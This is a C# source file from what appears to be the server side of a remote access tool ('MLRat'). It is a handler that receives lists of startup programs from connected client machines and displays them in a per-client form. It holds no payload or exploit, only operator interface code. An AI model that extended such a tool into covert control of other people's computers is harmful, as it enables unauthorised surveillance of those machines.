using MLManagementServer.Forms;
using MLRat.Server;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MLManagementServer.Handlers
{
    public static class StartupManagerhandler
    {
        static Dictionary<Guid, formStartupManager> FormHandler = new Dictionary<Guid, formStartupManager>();
        public static void Handle(IClient c, object[] data)
        {
            StartupManagerCommand command = (StartupManagerCommand)data[1];

            

            if(command == StartupManagerCommand.StartupItems)
            {
                Console.WriteLine("StartupCommand: {0}", command.ToString());
                if (FormHandler.ContainsKey(c.ID))
                {
                    string[] names = (string[])data[2];
                    string[] paths = (string[])data[3];
                    byte[] types = (byte[])data[4];
                    Console.WriteLine("Ammount of startup items: {0}", names.Length);
                    for(int i = 0; i < names.Length; i++)
                    {
                        FormHandler[c.ID].AddStartupItem(names[i], paths[i], types[i]);
                        Console.WriteLine("Added: {0}", names[i]);
                    }
                    
                }
            }
        }

        public static void ContextCallback(IClient[] clients)
        {
            foreach (IClient c in clients)
                Start(c);
        }

        public static void Disconnect(IClient c)
        {
            if (FormHandler.ContainsKey(c.ID))
            {
                FormHandler[c.ID].Close();
            }
        }

        public static void Start(IClient c)
        {
            if(!FormHandler.ContainsKey(c.ID))
            {
                formStartupManager form = new formStartupManager(c);
                form.FormClosed += Sm_FormClosed;
                FormHandler.Add(c.ID, form);
                form.Show();
            }
        }

        private static void Sm_FormClosed(object sender, System.Windows.Forms.FormClosedEventArgs e)
        {
            formStartupManager form = (formStartupManager)sender;
            if(FormHandler.ContainsKey(form.Client.ID))
            {
                FormHandler.Remove(form.Client.ID);
            }
            form.Dispose();
        }
    }
}
